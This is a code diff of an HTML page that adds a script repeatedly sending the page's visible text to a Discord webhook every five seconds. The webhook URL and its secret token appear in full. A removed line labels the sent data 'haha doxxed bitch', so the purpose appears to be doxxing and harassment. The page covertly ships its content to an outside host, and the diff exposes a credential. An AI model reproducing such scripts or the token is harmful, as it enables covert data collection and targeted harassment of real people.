@@ -18,8 +18,8 @@
       }
       scrollTitle();
   </script>
-
-<script>
+  
+  <script>
   const webhookURL = "https://discord.com/api/webhooks/1450587669636714627/FFJooBRr_O6-RZV7ne6fNEW-EsJtXw-nnuGN4DZpMNe9V90g53ZqOO1zzEYQhtfRen9E"; // replace with your actual webhook
 
   function sendToWebhook() {
@@ -28,11 +28,11 @@
     const embedPayload = {
       embeds: [
         {
-          title: "Visible Text",
-          description: haha doxxed bitch,
-          color: 0x3498db, 
+          title: "Visible Page Content",
+          description: visibleText,
+          color: 0x3498db, // blue background; change hex for other colors
           footer: {
-            text: "visibletext"
+            text: "Updated every 5 seconds"
           },
           timestamp: new Date().toISOString()
         }
@@ -1194,6 +1194,7 @@ body{
   </div>
  </body>
 </html>
+
 
 
 
